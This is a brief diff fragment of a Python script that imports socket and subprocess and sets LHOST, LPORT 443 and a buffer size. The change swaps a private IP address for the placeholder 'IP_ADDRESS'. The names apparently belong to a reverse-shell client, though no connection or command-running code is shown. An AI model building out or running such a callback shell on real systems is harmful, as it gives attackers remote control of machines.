@@ -2,7 +2,7 @@
 import socket as s
 import subprocess as sp
 
-LHOST = '192.168.0.8'
+LHOST = 'IP_ADDRESS'
 LPORT = 443
 BUFFERR_SIZE = 1024
 
